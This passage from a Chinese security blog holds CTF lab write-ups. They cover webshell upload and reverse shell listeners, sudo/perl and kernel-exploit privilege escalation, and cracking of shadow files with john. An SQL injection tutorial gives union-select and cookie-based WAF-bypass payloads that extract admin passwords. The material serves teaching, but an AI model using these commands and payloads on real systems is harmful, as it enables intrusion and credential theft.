<p>输入正确的参数（lhost、端口号等），再把内容拷贝到php文件即可使用</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211453611.png" alt="image-20211104211453611"></p>
<h4 id="2、制作python的websehll"><a href="#2、制作python的websehll" class="headerlink" title="2、制作python的websehll"></a>2、制作python的websehll</h4><p>这里的方法和生成php的webshell是一样的，只是这里加了重定向。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211632043.png" alt="image-20211104211632043"></p>
<h4 id="3、制作elf的webshell"><a href="#3、制作elf的webshell" class="headerlink" title="3、制作elf的webshell"></a>3、制作elf的webshell</h4><p>用于命令注入</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211112036.png" alt="image-20211104211112036"></p>
<h4 id="4、命令执行webshell"><a href="#4、命令执行webshell" class="headerlink" title="4、命令执行webshell"></a>4、命令执行webshell</h4><p>在输入端输入一下webshell（要按实际情况改）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211247531.png" alt="image-20211104211247531"></p>
<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>​    一般而言，webshell都是上传到404页面，因为方便利用</p>
<p>​    ●登录后台网站，直接上传文件，或者操作服务器下载文件</p>
<p>​    ●通过upload等服务，上传文件，或者操作服务器下载文件</p>
<p>​    ●有时候需要绕过防火墙上传文件，如《CTF综合测试》</p>
<p>​    ●利用注入漏洞上传文件</p>
<p>注意：如果需要服务器下载靶场的文件（如：webshell），需要在攻击机（kali）开启/创建http服务。</p>
<p><strong>启动/创建HTTP服务</strong></p>
<p><strong>方法一：</strong>python -m “SimpleHTTPServer”</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105094111832.png" alt="image-20211105094111832"></p>
<h2 id="步骤5：渗透获取shell"><a href="#步骤5：渗透获取shell" class="headerlink" title="步骤5：渗透获取shell"></a>步骤5：渗透获取shell</h2><p><strong>说明：</strong>渗透的方法有很多，方法不唯一。</p>
<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><h4 id="a、利用msf监听"><a href="#a、利用msf监听" class="headerlink" title="a、利用msf监听"></a>a、利用msf监听</h4><p>启动msf</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102170833011.png" alt="image-20211102170833011"></p>
<p>配置playload并启动监听（端口和lhost需要按实际来）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104220108129.png" alt="image-20211104220108129"></p>
<h4 id="b、使用nc-nlvp-port监听"><a href="#b、使用nc-nlvp-port监听" class="headerlink" title="b、使用nc -nlvp port监听"></a>b、使用nc -nlvp port监听</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103954832.png" alt="image-20211105103954832"></p>
<h3 id="触发反弹shell"><a href="#触发反弹shell" class="headerlink" title="触发反弹shell"></a>触发反弹shell</h3><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103820072.png" alt="image-20211105103820072"></p>
<p>触发shell方法    </p>
<p>​    ●点击点击/打开/查看文件</p>
<p>​    ●通过访问链接触发shell</p>
<p>​    ●等等</p>
<p>顺利的话，触发wenshell文件就会反弹shell了。</p>
<h2 id="步骤6：提权"><a href="#步骤6：提权" class="headerlink" title="步骤6：提权"></a>步骤6：提权</h2><p>​    反弹的shell一般都是普通用户权限，而flag常常在root权限，因此需要提权。如果反弹的shell不是终端（终端输入标识“$”、“~”、“#”），而是标准输入（什么都没或者是”&gt;”）;这是往往需要获取终端，因为sudo等操作往往需要终端输入。</p>
<h3 id="1、获取-启动终端"><a href="#1、获取-启动终端" class="headerlink" title="1、获取/启动终端"></a>1、获取/启动终端</h3><p>​        ● python -c  “ import pty;pty.spawn(‘/bin/bash’)” </p>
<p>​        ● python -c  “ import pty;pty.spawn(‘bin/sh’)”</p>
<p>​        ● python /tmp/asdf.py</p>
<p>​        ● echo “import pty;pty.spawn(‘/bin/bash’)” &gt; /tmp/asdf.py</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105102839635.png" alt="image-20211105102839635"></p>
<p>​    获取终端后，可以尝试用su命令使用弱密码尝试提权</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105104134139.png" alt="image-20211105104134139"></p>
<h3 id="2、查看用户可以使用那些root权限操作"><a href="#2、查看用户可以使用那些root权限操作" class="headerlink" title="2、查看用户可以使用那些root权限操作"></a>2、查看用户可以使用那些root权限操作</h3><p>​    <strong>sudo -l：</strong>查看普通用户可以使用那些sudo权限</p>
<h3 id="3、提权"><a href="#3、提权" class="headerlink" title="3、提权"></a>3、提权</h3><h4 id="a、利用密码提权"><a href="#a、利用密码提权" class="headerlink" title="a、利用密码提权"></a>a、利用密码提权</h4><p>​    su -用户名；再输入密码即可；更多的时候是需要自己探测用户名和密码；如进入数据库查找（《CTF综合测试》）、利用注入漏洞寻找等</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211030112056550.png" alt="image-20211030112056550"></p>
<h4 id="b、使用perl命令提权"><a href="#b、使用perl命令提权" class="headerlink" title="b、使用perl命令提权"></a>b、使用perl命令提权</h4><p>​    ①前提：用户可以执行perl命令</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211101222507358.png" alt="image-20211101222507358"></p>
<p>​    ②步：sudo perl -e “exec ‘/bin/sh’ “：运行sh，通过perl命令提权</p>
<p>​    ③步：bash -i ：以交互模式运行bash</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105102320820.png" alt="image-20211105102320820"></p>
<h4 id="c、溢出提权"><a href="#c、溢出提权" class="headerlink" title="c、溢出提权"></a>c、溢出提权</h4><p>​    详情看《FTP服务后门利用》</p>
<h4 id="d、内核溢出提权"><a href="#d、内核溢出提权" class="headerlink" title="d、内核溢出提权"></a>d、内核溢出提权</h4><p>查找漏洞：searchsploit 系统 版本号</p>
<p>​    如：searchsploit ubuntu 4.4.0</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101709122.png" alt="image-20211105101709122"></p>
<p>​    使用第三个漏洞（内核溢出代码文件名：41458.c）</p>
<p>将其内核溢出代码复制到桌面并编译为可以执行的文件<br>    cp /usr/share/exploitdb/exploits/linux/local/41458.c /root/desktop/1234.c</p>
<p>​    gcc 1234.c -o shellroot</p>
<p>​    参数说明：-o是输入，输出文件名问shellroot</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101312890.png" alt="image-20211105101312890"></p>
<p>利用获取的shell将sehllroot上传到靶机并设置文件执行权限</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101645298.png" alt="image-20211105101645298"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101737053.png" alt="image-20211105101737053"></p>
<p>执行shellroot</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101818781.png" alt="image-20211105101818781"></p>
<h4 id="e、利用john破解"><a href="#e、利用john破解" class="headerlink" title="e、利用john破解"></a>e、利用john破解</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103144827.png" alt="image-20211105103144827"></p>
<p>进入会话，下载passwd和shadow</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103210995.png" alt="image-20211105103210995"></p>
<p>文件格式化并重定向</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103236376.png" alt="image-20211105103236376"></p>
<p>使用john爆破出用户名和密码</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103256494.png" alt="image-20211105103256494"></p>
<h2 id="步骤7：获取flag"><a href="#步骤7：获取flag" class="headerlink" title="步骤7：获取flag"></a>步骤7：获取flag</h2><p>a、可疑网页及其源码处：有时候网页会存在flag信息，通过源码的注释或代码审计也有可能发现flag</p>
<p>b、当获取到普通shell时，需要有意识的查看其home目录下的文件，有时候会发现flag</p>
<p>c、root根目录下的flag，渗透模块，root目录下必然会存在falg，它常常存在root的根目录下</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105105225124.png" alt="image-20211105105225124"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211126110613621.png" alt="image-20211126110613621"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/10/07/SQL%E6%B3%A8%E5%85%A501/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/" class="post-title-link" itemprop="url">SQL注入01</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-10-07 22:04:44" itemprop="dateCreated datePublished" datetime="2021-10-07T22:04:44+08:00">2021-10-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-14 17:24:31" itemprop="dateModified" datetime="2023-08-14T17:24:31+08:00">2023-08-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p><strong>sql注入的一般分类（按照注入数据类型）：</strong></p>
<p>​    （1）数字型注入；当输入的参数为整型时，则有可能存在数字型注入漏洞。</p>
<p>​    （2）字符型注入；当输入参数为字符串时，则可能存在字符型注入漏洞。</p>
<p>​    （3）其他类型（例如：搜索型注入、Cookie注入、POST注入等）。　</p>
<p><strong>sql注入的高级分类(按照执行效果分类)：</strong></p>
<p>　　(1)基于布尔的盲注：即可以根据返回页面判断条件真假的注入。</p>
<p>　　(2)基于时间的盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</p>
<p>　　(3)基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>　　(4)联合查询注入：可以使用union的情况下的注入。</p>
<p>　　(5)堆查询注入：可以同时执行多条语句的注入。</p>
<p>　　(6)宽字节注入：利用gbk是多字节的编码，两个字节代表一个汉字</p>
<p>注意：一般SQL注入都是要利用多中注入手段的</p>
<p>学习补充链接：</p>
<p>1.<a target="_blank" rel="noopener" href="https://www.php.cn/safe/455989.html">https://www.php.cn/safe/455989.html</a></p>
<p>2.进阶：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl">https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl</a></p>
<h2 id="例1：布尔盲注-联合查询-堆查询注入（无防火墙）"><a href="#例1：布尔盲注-联合查询-堆查询注入（无防火墙）" class="headerlink" title="例1：布尔盲注+联合查询+堆查询注入（无防火墙）"></a>例1：布尔盲注+联合查询+堆查询注入（无防火墙）</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
<p>靶场传送门：<a target="_blank" rel="noopener" href="http://rhiq8003.ia.aqlab.cn/">http://rhiq8003.ia.aqlab.cn/</a></p>
<p><strong>第0步：判断是否存在数据库存储</strong></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093011830.png" alt="image-20210930093011830"></p>
<p>进入后</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093059714.png" alt="image-20210930093059714"></p>
<p><strong>第一步：判断是否存在sql注入漏洞</strong>（bool运算判断）</p>
<p><strong>构造 ：</strong>?id=1 and 1=1 ，回车，结果页面正常</p>
<p>说明：这里是布尔注入，构建了1=1的永真条件（这里的结果相当于没添加and 1=1，所以界面没变是正常</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093304245.png" alt="image-20210930093304245"></p>
<p><strong>构造：</strong> ?id=1 and 1=2 ,回车。</p>
<p>说明：1=2是永假条件，页面出现了变化（不正常），即状态回显了，可以利用这个应答效果；初步判断这里存在注入漏洞</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093544124.png" alt="image-20210930093544124"></p>
<p><strong>第二步：判断数据库字段数（order by）</strong></p>
<p><strong>构造：</strong> ?id=1 order by 1</p>
<p>结果：正常，（继续测试到出现回显错误为止。）</p>
<p>说明：order by函数是操作字段（列），如果第*列不存在，数据库会报错（回显报错）</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930094708112.png" alt="image-20210930094708112"></p>
<p><strong>构造：</strong>?id=1 order by 3</p>
<p>结果：页面回显出错（所以判断字段数（列数）为2）</p>
<p>说明：因为只是加了order by语句，相当于只是做了选择，但是没有进行其他操作，所以页面应该是不会变化的，除了order by操作出错，即选择的列不存在时</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095141092.png" alt="image-20210930095141092"></p>
<p><strong>第三步：利用错误回显来判断回显点（bool运算+select语句）</strong></p>
<p><strong>构造：</strong> ?id=1 and 1=2 union select 1,2 </p>
<p>结果：页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
<p>说明：要在回显错误的界面上进行测试，select后面的字段个数（这里的1,2）是由步骤二判断出的字段数决定的。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095601309.png" alt="image-20210930095601309"></p>
<p><strong>第四步：查询相关内容</strong></p>
<p>备注：都要在回显错误的界面操作</p>
<p><strong>查询当前数据库名</strong>：构造 ?id=1 and 1=2 union select 1,database() 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100557017.png" alt="image-20210930100557017"></p>
<p><strong>查询当前数据库版本</strong>：构造 ?id=1 and 1=2 union select 1,version() ，再回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100726382.png" alt="image-20210930100726382"></p>
<p><strong>查询当前数据库 表名</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 。绝大数情况下，管理员的账号密码都在admin表里。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100819524.png" alt="image-20210930100819524"></p>
<p><strong>知识补充</strong></p>
<p>（1）系统参数/变量：对于mysql、SQL、Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
<p><strong>information_schema.tables</strong>存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
<ul>
<li>table_schema: 记录<strong>数据库名</strong>；</li>
<li>table_name: 记录<strong>数据表名</strong>；</li>
<li>column_name ：记录<strong>字段名</strong></li>
<li>engine : 存储<strong>引擎</strong>；</li>
<li>table_rows: 关于表的粗略行估计；</li>
<li>data_length : 记录<strong>表的大小</strong>（单位字节）；</li>
<li>index_length : 记录表的<strong>索引的大小</strong>；</li>
<li>row_format: 可以查看数据表<strong>是否压缩</strong>过；</li>
</ul>
<p>（2）limit 0,1 ：从第0位开始，读取1个元素（数据）；这里回显内容地方只有一个，所以limit第二个参数一直都是1.</p>
<p><strong>查询字段名</strong></p>
<p>穷举查出 admin 表里 有  id  username  password  三个字段</p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150327642.png" alt="image-20210930150327642"></p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 1,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150451365.png" alt="image-20210930150451365"></p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 2,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150508924.png" alt="image-20210930150508924"></p>
<p><strong>查询字段内容</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车查看<strong>账号名</strong></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150755055.png" alt="image-20210930150755055"></p>
<p>查到了账号名，再<strong>查看密码</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151402562.png" alt="image-20210930151402562"></p>
<p><strong><em>到这里就窃取到了数据库管理员（账户）的账户（admin）和密码（hellohack）了</em></strong></p>
<p><strong>查看数据（内容）条数</strong></p>
<p>（密码）一直查，直到位空（回显错误），；构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150918351.png" alt="image-20210930150918351"></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151059407.png" alt="image-20210930151059407"></p>
<h2 id="例2：利用cookie绕过WAF网络防火墙"><a href="#例2：利用cookie绕过WAF网络防火墙" class="headerlink" title="例2：利用cookie绕过WAF网络防火墙"></a>例2：利用cookie绕过WAF网络防火墙</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
<p>靶场传送门：<a target="_blank" rel="noopener" href="http://kypt8004.ia.aqlab.cn/">http://kypt8004.ia.aqlab.cn/</a></p>
<p><strong>步骤0-1：判断是否存在sql注入漏洞</strong></p>
<p>具体过程和例1步骤0相同</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930194834400.png" alt="image-20210930194834400"></p>
<p><strong>步骤2：</strong>利用order by语句查询字段数</p>
<p>构造?id=171 order by 11，探测出字段数为10</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195008905.png" alt="image-20210930195008905"></p>
<p><strong>步骤3：联合查询注入（测试）</strong></p>
<p>构造?id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin，判断是否有admin这个表。</p>
<p>结果：经测试只要url出现select（查询）关键字，就会被防火墙拦截。。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195432374.png" alt="image-20210930195432374"></p>
<p>猜想：尝试将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截GET、POST传参。(绕过GET、POST请求的防火墙注入过滤)</p>
<p><strong>步骤4：利用web插件通过cookie注入</strong></p>
<p>说明：这里用了HackBar插件</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200409869.png" alt="image-20210930200409869"></p>
<p><strong>查看回显效果并猜测是否存在admin表（+号代替空格，不然会出错）：</strong></p>
<p><strong>构造cookie：</strong>id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin</p>
<p>结果：没有出现数据库错误，这证明admin表是存在的。且第2、第3、7、8、9字段，可以用来猜测字段名，同时，可以直接回显在页面上。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200519006.png" alt="image-20210930200519006"></p>
<p><strong>查看username和password字段的值</strong>：</p>
<p>测试我们接着尝试猜测最常见的管理表字段名Username和Password，我们在2、3、7、8、9中任选两个，分别填入Username和Password，比如2和3：</p>
<p><strong>构建cookie：</strong>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin</p>
<p>结果得到：admin（username）、b9a2a2b5dffb918c（password）</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20211001105731391.png" alt="image-20211001105731391"></p>
<p>这应该就是管理员用户名和密码了，但管理员密码看起来有些奇怪。字母+数字的16位组合，很像md5的特征。</p>
<p>打开cmd5.com（解密站点）</p>
<p>将b9a2a2b5dffb918c进行解密得到密码welcome</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203334045.png" alt="image-20210930203334045"></p>
<p><strong>步骤5：登录验证</strong></p>
<p>在主页url补/admin/，进入admin页面（kypt8004.ia.aqlab.cn/admin/），这个站貌似是南方的CMS，默认管理员后台是根目录的/admin/。</p>
<p>网站会自动重定向到kypt8004.ia.aqlab.cn/admin/Login.asp</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203438599.png" alt="image-20210930203438599"></p>
<p>登录成功</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930204247081.png" alt="image-20210930204247081"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">揭秘克隆website和钓鱼website背后的技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-22 09:08:07" itemprop="dateCreated datePublished" datetime="2021-08-22T09:08:07+08:00">2021-08-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 11:09:47" itemprop="dateModified" datetime="2021-10-08T11:09:47+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id><a href="#" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110616364.png" alt="image-20210908110616364"></h1><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110130833.png" alt="image-20210908110130833"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820094901355.png" alt="image-20210820094901355"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110635582.png" alt="image-20210908110635582"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095053082.png" alt="image-20210820095053082"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105753727.png" alt="image-20210908105753727"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095312794.png" alt="image-20210820095312794"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095343365.png" alt="image-20210820095343365"></p>
<p>重启网络服务</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095428655.png" alt="image-20210820095428655"></p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110111993.png" alt="image-20210908110111993"></h2><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100801661.png" alt="image-20210820100801661"></p>
